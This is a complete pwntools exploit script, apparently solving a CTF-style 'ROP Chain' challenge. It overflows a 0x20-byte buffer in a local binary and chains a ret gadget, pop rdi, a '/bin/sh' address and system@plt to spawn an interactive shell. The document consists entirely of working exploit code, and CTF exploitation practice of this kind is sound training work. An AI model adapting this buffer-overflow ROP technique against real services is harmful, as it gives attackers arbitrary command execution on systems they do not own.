#!/usr/bin/env python3
from pwn import *

HOST, PORT = '127.0.0.1', 13375
r = remote(HOST, PORT)

context.arch = 'amd64'

elf = ELF('./vuln', checksec=False)

pop_rdi    = elf.symbols['my_gadget']  # 0x401196: pop rdi; ret
ret        = next(elf.search(b'\xc3')) # 0x40101a
system_plt = elf.plt['system']         # 0x401090
binsh      = 0x402004                  # "/bin/sh" 字符串地址（.rodata）

r.recvuntil(b'=== SLsec Pwn: ROP Chain ===\n')

# buf[0x20] + saved_rbp[8] = 0x28 padding
payload  = b'A' * 0x28
payload += p64(ret)        # 栈对齐
payload += p64(pop_rdi)    # pop rdi; ret
payload += p64(binsh)      # rdi = "/bin/sh"
payload += p64(system_plt) # system("/bin/sh")

r.send(payload)
r.interactive()
